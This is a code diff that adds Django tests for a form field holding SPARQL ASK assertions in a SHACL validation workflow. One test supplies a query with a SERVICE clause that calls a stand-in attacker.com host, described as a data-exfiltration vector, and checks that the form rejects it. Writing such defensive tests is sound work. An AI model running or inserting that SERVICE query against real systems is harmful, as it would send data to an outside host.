@@ -486,3 +486,313 @@ class BuildShaclConfigTests(TestCase):
         assert "PersonShape" in updated_ruleset.rules_text
         assert "ex:Building" in updated_ruleset.metadata["ontology_text"]
         assert config["shapes_text_preview"] == step.config["shapes_text_preview"]
+
+
+# ──────────────────────────────────────────────────────────────────────
+# SPARQL ASK assertions field — covers the Phase 1c addition. The
+# field accepts a JSON list of assertions; the form's clean() runs
+# both the SPARQL AST scrubber and entry-shape validation before the
+# step can save. These tests confirm:
+#
+# 1. Well-formed JSON with safe queries passes and is persisted.
+# 2. Malformed JSON, bad per-entry shape, and forbidden constructs
+#    all produce form errors and prevent save.
+# 3. The keep-existing semantic works (blank textarea on edit
+#    preserves previously saved assertions).
+#
+# Maps to ADR-2026-05-18 "Phase 1c — SPARQL ASK assertions" and the
+# acceptance-test list in its "Security" subsection.
+# ──────────────────────────────────────────────────────────────────────
+
+
+class ShaclSparqlAssertionsFormTests(TestCase):
+    """Form-level tests for the new SPARQL ASK assertions textarea field."""
+
+    def setUp(self):
+        # Mirror BuildShaclConfigTests's factory pattern — use the
+        # WorkflowFactory's org parameter directly so the project /
+        # workflow / org all line up for the cross-org validation
+        # check enforced in Workflow.save().
+        self.org = OrganizationFactory()
+        self.user = UserFactory()
+        self.project = ProjectFactory(org=self.org)
+        self.workflow = WorkflowFactory(org=self.org, user=self.user)
+
+    def _base_data(self):
+        """A minimal valid base form payload — only SPARQL field varies per test."""
+        return {
+            "name": "Step name",
+            "description": "",
+            "shapes_text": VALID_SHAPES,
+            "inference_mode": "rdfs",
+            "advanced_shacl": True,
+            "submission_format": "auto",
+        }
+
+    def test_well_formed_json_with_safe_query_validates(self):
+        """A safe ASK persisted to cleaned_data["sparql_assertions"].
+
+        End-to-end happy path: JSON parses, scrubber accepts the query,
+        the form returns a normalised dict list ready to persist. The
+        severity is normalised from author input ("error") to the
+        canonical ``Severity.ERROR`` enum value ("ERROR").
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = (
+            '[{"target_graph": "data", '
+            '"query": "ASK { ?s ?p ?o }", '
+            '"severity": "error"}]'
+        )
+        form = ShaclStepConfigForm(data=data)
+        assert form.is_valid(), form.errors
+        cleaned = form.cleaned_data["sparql_assertions"]
+        assert len(cleaned) == 1
+        assert cleaned[0]["target_graph"] == "data"
+        # Normalised to the canonical Severity enum value (uppercase).
+        assert cleaned[0]["severity"] == "ERROR"
+
+    def test_empty_textarea_yields_empty_list(self):
+        """Blank textarea normalises to ``[]`` — no error, no assertions.
+
+        Most authors won't write SPARQL gates. The field must remain
+        optional with a clean default; an empty input must not produce
+        a form error.
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = ""
+        form = ShaclStepConfigForm(data=data)
+        assert form.is_valid(), form.errors
+        assert form.cleaned_data["sparql_assertions"] == []
+
+    def test_malformed_json_produces_form_error(self):
+        """Unparseable JSON is rejected with a clear inline message.
+
+        The form must not silently swallow JSON errors — authors need
+        to see exactly what's broken so they can fix it.
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = "this is not JSON"
+        form = ShaclStepConfigForm(data=data)
+        assert not form.is_valid()
+        assert "sparql_assertions_json" in form.errors
+
+    def test_top_level_must_be_list(self):
+        """A JSON object at the top level is rejected.
+
+        The shape is a list-of-assertions; this guards against authors
+        accidentally pasting a single object thinking the textarea
+        accepts one assertion at a time.
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = (
+            '{"target_graph": "data", "query": "ASK { ?s ?p ?o }"}'
+        )
+        form = ShaclStepConfigForm(data=data)
+        assert not form.is_valid()
+        assert "sparql_assertions_json" in form.errors
+
+    def test_bad_target_graph_produces_form_error(self):
+        """Per-entry validation: target_graph must be data/results/union.
+
+        Catches typos like "datas" before they reach the engine. Each
+        bad entry gets its own error indexed by position so the author
+        knows which assertion to fix.
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = (
+            '[{"target_graph": "elsewhere", '
+            '"query": "ASK { ?s ?p ?o }", '
+            '"severity": "error"}]'
+        )
+        form = ShaclStepConfigForm(data=data)
+        assert not form.is_valid()
+        assert "sparql_assertions_json" in form.errors
+
+    def test_missing_query_produces_form_error(self):
+        """The ``query`` field is required and non-empty per assertion.
+
+        An assertion without a query is meaningless; rejection here
+        prevents the engine from trying to scrub an empty string later.
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = (
+            '[{"target_graph": "data", "severity": "error"}]'
+        )
+        form = ShaclStepConfigForm(data=data)
+        assert not form.is_valid()
+        assert "sparql_assertions_json" in form.errors
+
+    def test_select_query_rejected_by_scrub(self):
+        """A SELECT query is refused at save by the form-level scrubber.
+
+        This is the load-bearing security test for the form layer:
+        without it, every other Phase 1c safety guarantee relies on
+        the engine re-checking. The form pre-check exists so authors
+        never persist a bad query in the first place.
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = (
+            '[{"target_graph": "data", '
+            '"query": "SELECT * WHERE { ?s ?p ?o }", '
+            '"severity": "error"}]'
+        )
+        form = ShaclStepConfigForm(data=data)
+        assert not form.is_valid()
+        assert "sparql_assertions_json" in form.errors
+
+    def test_service_query_rejected_by_scrub(self):
+        """A SERVICE clause is refused at save — the canonical exfil vector.
+
+        If this passes the form, the workflow saves with a query that
+        would leak data the moment a submission runs. Form rejection
+        is the primary defence.
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = (
+            '[{"target_graph": "data", '
+            '"query": "ASK { SERVICE <http://attacker.com/> { ?s ?p ?o } }", '
+            '"severity": "error"}]'
+        )
+        form = ShaclStepConfigForm(data=data)
+        assert not form.is_valid()
+        assert "sparql_assertions_json" in form.errors
+
+    def test_count_exceeding_cap_rejected(self):
+        """The per-step cap stops authors from pasting unlimited assertions.
+
+        Each assertion adds compute cost per submission; the cap is
+        the form's way of bounding worst-case workflow cost.
+        """
+        from django.test import override_settings
+
+        # 3 entries with cap set to 2 — should reject without even
+        # running the scrubber on individual entries.
+        with override_settings(SHACL_SPARQL_ASKS_PER_STEP_MAX=2):
+            data = self._base_data()
+            data["sparql_assertions_json"] = (
+                "["
+                + ", ".join(
+                    '{"target_graph": "data", "query": "ASK { ?s ?p ?o }", '
+                    '"severity": "error"}'
+                    for _ in range(3)
+                )
+                + "]"
+            )
+            form = ShaclStepConfigForm(data=data)
+            assert not form.is_valid()
+            assert "sparql_assertions_json" in form.errors
+
+    def test_severity_aliases_normalise_to_canonical_enum(self):
+        """Author can paste 'ERROR', 'error', or 'WARN' — all normalise.
+
+        Forgiving input handling: authors may paste upper-case labels
+        from docs, lower-case English words, or the short ``warn``
+        alias. The form normalises every accepted form to the
+        canonical ``Severity`` enum value (upper-case "ERROR" /
+        "WARNING" / "INFO") so downstream code never has to compare
+        multiple cases.
+        """
+        cases = [
+            ("error", "ERROR"),
+            ("ERROR", "ERROR"),
+            ("Error", "ERROR"),
+            ("warning", "WARNING"),
+            ("WARN", "WARNING"),
+            ("info", "INFO"),
+        ]
+        for author_input, canonical in cases:
+            data = self._base_data()
+            data["sparql_assertions_json"] = (
+                '[{"target_graph": "data", '
+                '"query": "ASK { ?s ?p ?o }", '
+                f'"severity": "{author_input}"}}]'
+            )
+            form = ShaclStepConfigForm(data=data)
+            assert form.is_valid(), f"severity '{author_input}' rejected: {form.errors}"
+            normalised = form.cleaned_data["sparql_assertions"][0]["severity"]
+            assert normalised == canonical, (
+                f"severity '{author_input}' normalised to {normalised!r}, "
+                f"expected {canonical!r}"
+            )
+
+    def test_build_shacl_config_persists_assertions(self):
+        """End-to-end: form → build_shacl_config → Ruleset.metadata.
+
+        Confirms the persistence wiring: a form with assertions saves
+        them into ``Ruleset.metadata["sparql_assertions"]`` where the
+        engine looks for them at validation time. The shape is the
+        normalised dict list (not the raw JSON string).
+        """
+        data = self._base_data()
+        data["sparql_assertions_json"] = (
+            '[{"target_graph": "data", '
+            '"query": "ASK { ?s ?p ?o }", '
+            '"severity": "error", '
+            '"description": "Must have triples", '
+            '"error_message_template": "No data found"}]'
+        )
+        form = ShaclStepConfigForm(data=data)
+        assert form.is_valid(), form.errors
+
+        _config, ruleset = build_shacl_config(self.workflow, form, step=None)
+        assert "sparql_assertions" in ruleset.metadata
+        assert len(ruleset.metadata["sparql_assertions"]) == 1
+        assertion = ruleset.metadata["sparql_assertions"][0]
+        assert assertion["query"] == "ASK { ?s ?p ?o }"
+        assert assertion["description"] == "Must have triples"
+        assert assertion["error_message_template"] == "No data found"
+
+    def test_keep_existing_assertions_on_edit_with_blank_textarea(self):
+        """Blank textarea on edit preserves previously saved assertions.
+
+        Mirrors the shapes / ontology keep-existing semantic. Authors
+        editing a step to (say) change inference mode should not lose
+        their carefully-written SPARQL gates just because they left the
+        textarea blank.
+        """
+        existing = [
+            {
+                "target_graph": "data",
+                "query": "ASK { ?s ?p ?o }",
+                "severity": "ERROR",
+                "description": "existing",
+                "error_message_template": "",
+            },
+        ]
+        ruleset = RulesetFactory(
+            org=self.org,
+            ruleset_type=RulesetType.SHACL,
+            rules_text=VALID_SHAPES,
+            metadata={
+                "shape_files": [],
+                "ontology_text": "",
+                "ontology_files": [],
+                "bundled_standards": [],
+                "inference_mode": "rdfs",
+                "advanced_shacl": True,
+                "submission_format": "auto",
+                "sparql_assertions": existing,
+            },
+        )
+        step = WorkflowStepFactory(
+            workflow=self.workflow,
+            ruleset=ruleset,
+            config={
+                "shape_files": [],
+                "ontology_files": [],
+                "sparql_assertions": existing,
+            },
+        )
+        # Author edits with blank textarea — must keep existing.
+        form = ShaclStepConfigForm(
+            data={
+                **self._base_data(),
+                "shapes_text": "",
+                "sparql_assertions_json": "",
+            },
+            step=step,
+        )
+        assert form.is_valid(), form.errors
+        _config, updated = build_shacl_config(self.workflow, form, step=step)
+        updated.refresh_from_db()
+        assert updated.metadata["sparql_assertions"] == existing
